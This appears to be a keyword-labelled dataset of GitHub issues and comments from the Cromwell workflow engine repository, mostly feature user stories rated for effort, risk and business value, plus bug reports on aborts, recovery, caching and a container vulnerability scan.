Safety,"As a **user running workflows on PAPI**, I want **my workflow to be upgraded from preemptible to regular compute if it is killed after 24 hours rather than retrying**, so that I can **avoid retrying on a job that will need more than 24 hours to run**.; - Effort: **Small**; - Risk: **Small to Medium**; - We'd need a way of being certain that the job was killed due to timeout, rather than another reason, to prevent from upgrading jobs that the user doesn't want upgraded.; - The information about a preemptible VM timing out should come from Google.; - This should be an ""opt-in"" feature, so users do not have the default behavior change from under them.; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-329479096:184,avoid,avoid,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-329479096,3,"['Risk', 'avoid', 'timeout']","['Risk', 'avoid', 'timeout']"
Safety,"As a **user running workflows on an HPC cluster**, I want **Cromwell to periodically check that my jobs are still running**, so that I can **know when jobs are alive versus when they reach the runtime limits and are killed by the backend**.; - Workaround: **Yes**; - from @delocalizer ; > The hacky non-async solution I have been using...was to have two check cycles, a frequent cheap one to see if rc existed and occasional expensive one to [poll the scheduler itself](https://github.com/delocalizer/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/backend/pbs/PbsBackend.scala#L128-L166); - Effort: **Small**; - Risk: **Small**; - Business value: **Small to Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328207932:625,Risk,Risk,625,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328207932,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want **Cromwell to follow this order for looking at inputs: Inputs provided by the inputs JSON, Inputs specified explicitly by call, and then the default value in the task**, so that **Cromwell is processing the inputs that I want it to**. - Effort: @geoffjentry any thoughts?; - Risk: Small; - Business value: Small to Medium; - @cjllanwarne have any users asked or complained about this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2446#issuecomment-335540877:315,Risk,Risk,315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2446#issuecomment-335540877,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want **Cromwell to split up its docker hashes by registry**, so that **if one registry is slow, that it doesn't affect the performance of the other registries**.; - Effort: Small to medium; - Risk: Small; - Business value: Small to medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399:227,Risk,Risk,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want **Cromwell to use a default job count limit if I have not configured a `concurrent-job-limit`**, so that **the backend defaults to a sensible job limit**.; * Effort: Small; * Risk: Small; * Business Value: Small to Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911:215,Risk,Risk,215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want **to see fewer unhelpful log messages**, so that **performance improves and it is easier to find important messages**. More information and improvement ideas in the [Logging spec](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). - effort: Small to Medium; - risk: Small; - Currently we show too many log messages, which degrades performance. We risk showing too few, but I think it's a risk we can mitigate.; - business value: Medium ; - Our logs are where users go to debug workflows, and currently they are a haystack to pick through.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-344984674:337,risk,risk,337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-344984674,3,['risk'],['risk']
Safety,"As a **user running workflows**, I want to **be able to specify the backend in workflow options**, so that **Cromwell only uses the default backend when no other is specified, and notifies the user that it is using the default**. - Effort: X-Small to Small; - Risk: Small; - Note that some WDL may break, consider ways to deprecate (with warning messages in the WDLs).; - Business value: Small, for now; - This may change as Cromwell supports more backends and more users operate in a multi-backend environment",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-335814075:260,Risk,Risk,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-335814075,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want to **know how to `expandSubworkflows` by reading the documentation**, so that **I know when to use this feature**. Effort: Small; Risk: Extra-Small; Business value: Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2420#issuecomment-333186989:170,Risk,Risk,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2420#issuecomment-333186989,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want to **override runtime variables**, so that I can **change hardcoded runtime attributes when someone else wrote the method**.; - Effort: **Small**; - Risk: **Small**; - Carefully vet a good solution; - Avoid breaking changes; - Business value: **Small to Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-324084418:189,Risk,Risk,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-324084418,2,"['Avoid', 'Risk']","['Avoid', 'Risk']"
Safety,"As a **user running workflows**, I want to **see a timing diagram or other useful error message when my workflow has failed before making any calls**, so that **I know why I don't see the timing diagram like I expect.**; - Effort: Small; - Risk: X-Small; - Business value: Small; - I haven't heard any mention of this for a while from customers or other internal folk.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1887#issuecomment-345359398:240,Risk,Risk,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1887#issuecomment-345359398,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want to **see my stderr output even when Cromwell gets a ""FileNotFound"" response** so that I can **debug my workflow**.; - Effort: Small to Medium; - We're not sure of the exact way to fix it, so for now we have been patching the issue.; - Risk: Small; - Business value: Small; - There is a workaround, to manually look up the stderr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2378#issuecomment-336149092:275,Risk,Risk,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2378#issuecomment-336149092,1,['Risk'],['Risk']
Safety,"As a **user setting up Cromwell**, I want **only want to see references to Google Genomics Pipelines API**, so that **I know how to set up the Google backend, not some JES thing.**; - effort: small; - risk: small to medium; - business value: small; - may grow if it becomes confusing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-344685888:201,risk,risk,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-344685888,1,['risk'],['risk']
Safety,"As a **user with images in Singularity**, I want **Cromwell to support using Singularity images (either via Singularity Hub and the command line, or connecting via API)**, so that I can **use Singularity images and not have to duplicate them in Docker**.; - Effort: ** @geoffjentry ? **; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-330341279:290,Risk,Risk,290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-330341279,1,['Risk'],['Risk']
Safety,"As a **user**, I want **Cromwell to not check the backend attribute**, so that I can **not be distracted by strange warnings that aren't actually useful**.; - Effort: **Small**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1997#issuecomment-328541603:180,Risk,Risk,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1997#issuecomment-328541603,1,['Risk'],['Risk']
Safety,"As a **workbench QA**, I want **to know what is being tested**, so that I **don't under- or over-test for each release**. ; - Effort: **Medium**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-326636660:148,Risk,Risk,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-326636660,1,['Risk'],['Risk']
Safety,"As a **workflow runner running on Local**, I want **Cromwell to localize one copy of a file from the cloud when I use it multiple times in my workflow**, so that I **am only charged egress to local once**.; - Effort: **?** @geoffjentry ; - Risk: **?** @geoffjentry ; - Be careful that inputs aren't being modified in place before allowing them to be used again; - Business value: **TBD**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-328201762:240,Risk,Risk,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-328201762,1,['Risk'],['Risk']
Safety,"As a **workflow runner using the CLI**, I want **an option to send the output JSON into a separate file**, so that I can **avoid digging through the whole metadata for the information I need**.; - Effort: **Small** ; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1578#issuecomment-328204540:123,avoid,avoid,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1578#issuecomment-328204540,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,"As a **workflow runner**, I want **Cromwell to automatically retry my workflow with increased memory/disk/on a specific error code, etc**, so that I can **get my workflow to complete without having to manually intervene**.; - Effort: **?** @geoffjentry ; - Risk: **Medium**; - if users are unaware that they have retries set in ways that would cost them a lot the 2nd or tertiary run, i.e to double their memory, they could end up paying for a much more expensive VM when a smaller one would do; - Business value: **Large**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-327935408:257,Risk,Risk,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-327935408,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **certain parameters to be ignored in the hashing process**, so that I can **call cache on more workflows when the result is exactly the same**.; - Effort: **?**; - Risk: **Medium** ; - We should err on the side of hashing a workflow differently if we are not absolutely confident that the parameter does not impact the result.; - Which parameters are ignored is NOT user-editable. This is to prevent users from accidentally ignoring parameters that do impact the result.; - Business value: **Medium**. Some parameters, such as `preemptible_attempts` and `CPU`, don't affect the outcome of the workflow but workflows with different CPU values will not call cache. @LeeTL1220 and @geoffjentry to provide additional thoughts and context if helpful.; Related issue #1210",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604:198,Risk,Risk,198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **periodically copy workflow logs**, so that I can **view intermediary results without waiting for the workflow to complete**.; - Effort: **Small**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1448#issuecomment-327890924:184,Risk,Risk,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1448#issuecomment-327890924,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **to be able to reference Cromwell's workflow ID in a WDL**, so that I can **programmatically query for metadata about that workflow**.; - Effort: **Small** ; - Risk: **Small** ; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-328202942:194,Risk,Risk,194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-328202942,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **to be able to select certain tasks to call cache or not call cache on**, so that I can **?**. @LeeTL1220 to help with this. @geoffjentry thoughts on the following?; - Effort: **TBD**; - Risk: **TBD**; - Business value: **TBD**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-326664023:221,Risk,Risk,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-326664023,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **to delete information I no longer need from a workflow**, so that I can **stop paying for storage for it**.; - Effort: **Large**; - Risk: **Medium to Large**; - - implications for call caching?; - - provenance?; - Business value: **Medium to Large**; - - big cost-saver",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-325483057:167,Risk,Risk,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-325483057,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **to selectively invalidate a workflow so that Cromwell does not use it for a cache-hit**, so that I can **not use bad or old workflow results in my new workflows**.; - Effort: **Medium**; - Risk: **Medium**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-327930116:224,Risk,Risk,224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-327930116,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **use Command+C to abort running jobs**, so that I can **fully shut down Cromwell using a standard command shortcut**.; - Effort: **?** @geoffjentry ; - Risk: **?**; - Business value: **Small to Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1495#issuecomment-328200426:52,abort,abort,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1495#issuecomment-328200426,2,"['Risk', 'abort']","['Risk', 'abort']"
Safety,"As a pipeline author, I would like the ability to add assert-like statements to my tasks. For example, after the task has run check the output log for the presence of some message. This is important because we often find problems in the pipelines that we could have detected with some basic checks that could be part of the pipeline. They are different than unit tests because these problems often only arise under unusual data conditions that are hard to predict. The current approach on this is for @yfarjoun to test run these ideas just within the command block of WDL as a way to figure out what this feature really looks like. Then from that set of we can figure out what features need to be added in order to support this in a natural, DRY way",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1146:266,detect,detected,266,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1146,2,"['detect', 'predict']","['detected', 'predict']"
Safety,"As a side effect to enable abort support in HtCondor, this PR makes the polling (for checking job status) asynchronous, and the polling interval to be configurable.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1403:27,abort,abort,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1403,1,['abort'],['abort']
Safety,"As a user who runs cromwell in a production setting (like @ktibbett), I need to be able to manage the lifecycle of workflows in the system. After running many workflows, they consume a lot of space on disk and even within the cromwell environment. I woul to be able to delete them through a REST endpoint. Add a new endpoint at DELETE/workflows/{version}/{id} which effectively removes this workflow from the system. This should include; - removing all output files for the workflows and calls; - removing all metadata from the metadata service; - removing all workflows/calls from the call caching service. attempting to remove a workflow in a non-terminal state should result in an error (it should either finish or be aborted first). --; In detail specification:. https://docs.google.com/document/d/1aJn5HzvDgYbvBlEG4z0KO8oZgaQ3lFu2hE8QzRC0_18/edit?usp=sharing",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292:721,abort,aborted,721,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292,1,['abort'],['aborted']
Safety,"As a user with a controlled file system (like GOTC or the cromwell execution directory) where the I know that a file path is immutable and uniquely identifying, I would like to run the cromwell server in a mode where the file path can be used in call caching rather than computing the actual hash. I will take on the risk that if I break that contract (by modifying files), workflows will not execute properly. I want to do this because it will be a big performance gain when I have many files and I know that their paths are unique. @cjllanwarne gets credit for raising this as a cool feature, @jsotobroad and @dshiga agreed",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1271:317,risk,risk,317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1271,2,['risk'],['risk']
Safety,"As a user, I would like to be able to call an endpoint in cromwell which takes in a workflow submission identifier and have cromwell clean up all intermediate outputs of the workflow (files that are not declared as outputs of the workflow).; If there is a job avoidance feature when this is worked on, these cleaned up tasks internal to the workflow should not be eligible for job avoidance. However, the overall workflow would be eligible.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/601:260,avoid,avoidance,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/601,2,['avoid'],['avoidance']
Safety,"As discussed in https://github.com/broadinstitute/cromwell/issues/6235, developers of workflows for GCP who store their images in Google Container Repositories can be exposed to large Google GCS egress charges when users attempt to run workflows in different continental regions, resulting in many trans-continental container pulls. There currently does not seem to be a satisfactory way to guard against this:. - We can't make our image repositories private because we want to make the workflows available to the public via Terra.; - We can't make the repositories requester-pays because the pipelines API does not support pulling images from requester-pays repositories.; - We can mirror our repositories to different regions, but we are still dependent on our users to configure their workflows to point to the right region and take good-faith extra steps to help us avoid these charges. Some possible ideas were suggested by @freeseek in https://github.com/broadinstitute/cromwell/issues/6235:. - Convince Google to support requester-pays buckets for container pulls in PAPI.; - Modify some combination of Cromwell/PAPI to cache images rather than pulling them for each task that is run.; - Develop infrastructure within Cromwell to know what region the workflow is running in and automatically select the right GCR mirror to pull from.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442:870,avoid,avoid,870,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442,1,['avoid'],['avoid']
Safety,"As far as I can tell, the timeline is:. - Shutdown signal received; - The job is aborted in JES but not removed from the JobStore; - On restart, the job is recovered because it remains in the JobStore, but in JES it's already been aborted; - On the console, a ""Job Failed"" message appears.; - The EJEA actor dies in an unexpected way (this concerns me *most*. Why isn't the failure cause recorded!). Not tested on SFS backends.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2050:81,abort,aborted,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2050,3,"['abort', 'recover']","['aborted', 'recovered']"
Safety,"As far as I can tell, when this happens today, the WEA crashes and hopes that the WA will recover it, but that doesn't actually seem to happen. What seems to happen is the WA sends a message back to the (now defunct) WEA asking it to please abort whatever it was working on.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5595#issuecomment-665248398:90,recover,recover,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5595#issuecomment-665248398,2,"['abort', 'recover']","['abort', 'recover']"
Safety,"As long as we can still do ""Abort All"" and support Ctrl-C",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-200836619:28,Abort,Abort,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-200836619,1,['Abort'],['Abort']
Safety,"As pointed out by @davidbernick, there are some vulnerabilities in Cromwell's docker image. Beyond that, it's a good idea to periodically update the underlying image. This is not deemed to be a critical issue (yet) from a security perspective, but we should make sure to clear this up when we get a chance. $ docker run -it --rm -e CLAIR_ADDR=http://clair.bits-infosec.broadinstitute.org:6060 -e CLAIR_OUTPUT=High -e CLAIR_THRESHOLD=10 -e DOCKER_USER=davidbernick -e DOCKER_PASSWORD='xxxxx' broadinstitute/klar broadinstitute/cromwell:dev; clair timeout 1m0s; docker timeout: 1m0s; no whitelist file; Analysing 10 layers; Got results from Clair API v1; Found 139 vulnerabilities; Unknown: 3; Negligible: 47; Low: 38; Medium: 44; High: 7. CVE-2017-12424: [High] ; Found in: shadow [1:4.4-4.1]; Fixed By: ; In shadow before 4.5, the newusers tool could be made to manipulate internal data structures in ways unintended by the authors. Malformed input may lead to crashes (with a buffer overflow or other memory corruption) or other unspecified behaviors. This crosses a privilege boundary in, for example, certain web-hosting environments in which a Control Panel allows an unprivileged user account to create subaccounts.; https://security-tracker.debian.org/tracker/CVE-2017-12424; -----------------------------------------; CVE-2018-13347: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; mpatch.c in Mercurial before 4.6.1 mishandles integer addition and subtraction, aka OVE-20180430-0002.; https://security-tracker.debian.org/tracker/CVE-2018-13347; -----------------------------------------; CVE-2017-17458: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; In Mercurial before 4.4.1, it is possible that a specially malformed repository can cause Git subrepositories to run arbitrary code in the form of a .git/hooks/post-update script checked into the repository. Typical use of Mercurial prevents construction of such repositories, but they can be created programmatically.; htt",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4979:546,timeout,timeout,546,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4979,2,['timeout'],['timeout']
Safety,"As predicted in the ticket, simply removing the swagger `default` allows this value to be exercised correctly from the UI.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5277:3,predict,predicted,3,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5277,1,['predict'],['predicted']
Safety,Asynced the standard backend execute/recover.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1947:37,recover,recover,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1947,1,['recover'],['recover']
Safety,"At least ""allows result reuse"" and ""results cloned"" (the latter being transformed from an fk to a boolean). Returning hashes might be helpful too for diagnosing why executions don't avoid.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/559:182,avoid,avoid,182,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/559,1,['avoid'],['avoid']
Safety,"At the moment there's a single Cromwell server underlying the CromIAM server, and all Cromwell traffic is directed there. Modify CromIAM to allow for a second Cromwell address (defaulting to the main one), and direct abort requests to that Cromwell. NB: This is an intermediate term hack, so err on the side of quick & pragmatic instead of perfect & beautiful",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4142:217,abort,abort,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4142,1,['abort'],['abort']
Safety,"At the risk of derailing this into a 1.1 thread, I have heard that WDL 1.1 adds support for directory outputs (which would completely sidestep like 50% of the issues I currently have when writing WDLs, including this one involving basename/sub/select_first) but I don't see that on the 1.1 spec -- is that a 1.1 feature or a development (1.2?) feature?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233537172:7,risk,risk,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233537172,1,['risk'],['risk']
Safety,At this moment there is a way to submit jobs to a HPC with a command line that is executed. With drmaa this is also possible. The only problem is that with drmaa v1 you can only get status of jobs submitted in the same session. This means for recovering after a restart you must rely on command line methods like in the current implementation. Drmaa v2 have the possibility to track jobs outside it's session but there is almost no support for v2 yet. Here is the implementation inside queue:; https://github.com/broadgsa/gatk/tree/master/public/gatk-queue/src/main/scala/org/broadinstitute/gatk/queue/engine/drmaa,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1355:243,recover,recovering,243,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1355,1,['recover'],['recovering']
Safety,Atomic file copying to avoid partial inputs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1426:23,avoid,avoid,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1426,1,['avoid'],['avoid']
Safety,Attempts to unflakify the abort tests by making them fail reliably if they fail > 20% of the time.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3321:26,abort,abort,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3321,1,['abort'],['abort']
Safety,Automatic detection+localization of index files,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1412:10,detect,detection,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1412,1,['detect'],['detection']
Safety,Avoid ConfigFactory.load all over the place,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796:0,Avoid,Avoid,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796,1,['Avoid'],['Avoid']
Safety,Avoid hashing Scopes. Closes #1457,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1468:0,Avoid,Avoid,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1468,1,['Avoid'],['Avoid']
Safety,Avoid unnecessary IO,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3602:0,Avoid,Avoid,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3602,1,['Avoid'],['Avoid']
Safety,Avoid unnecessary token refreshing,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1429:0,Avoid,Avoid,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1429,1,['Avoid'],['Avoid']
Safety,Avoiding copying input file for docker by mounting volume,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3447:0,Avoid,Avoiding,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3447,1,['Avoid'],['Avoiding']
Safety,"BCS appears to have already wired through a `timeout` runtime attribute. This would be valuable as an option in PAPIv2 as well, especially as we are encountering problems with non-terminating actions. See https://gatkforums.broadinstitute.org/gatk/discussion/comment/58454/#Comment_58454 for a motivating use case. The code to amend with a custom timeout is where we build the `Pipeline` for the request: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/pipelines/v2alpha1/src/main/scala/cromwell/backend/google/pipelines/v2alpha1/GenomicsFactory.scala#L135",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4946:45,timeout,timeout,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4946,2,['timeout'],['timeout']
Safety,Backend Store performing recovery closes #751,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1241:25,recover,recovery,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1241,1,['recover'],['recovery']
Safety,"Backend: AWS Batch. Workflow: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/frankenstein.wdl. Input file: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/map-variantcall-hg38.json. Possibly related to #4412 but not sure as I don't see the same error message. When submitting a workflow via the cromwell server we **consistently** see a failure to hash some items in S3 resulting in call caching being disabled for the run. We have seen this for a number of workflows, here we are including just one. . Call caching is a **hugely** important feature for us and if it is not available we may would have to reconsider using Cromwell. I think I have discussed with @ruchim the fact that all objects in S3 have a hash already computed (the ETag header) so there should not be timeouts in computing these hashes as they are available with a head request (you don't need to download the whole object). . Error message (extract from `/metadata` output):. ```; ""callCaching"": {; ""hashFailures"": [; {; ""causedBy"": [],; ""message"": ""Hashing request timed out for: s3://bucketname/cromwell-tests/Panel_BWA_GATK4_Samtools_Var_Annotate/162c863f-c22a-4b7c-bb37-f5195b329b36/call-ApplyBQSR/shard-0/smallTestData.hg38.recal.bam""; }; ],; ""allowResultReuse"": false,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. Config file:. ```; include required(classpath(""application"")). call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:file:aws-database;shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }; }. aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; {; name = ""assume-role-based-on-anothe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563:893,timeout,timeouts,893,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563,1,['timeout'],['timeouts']
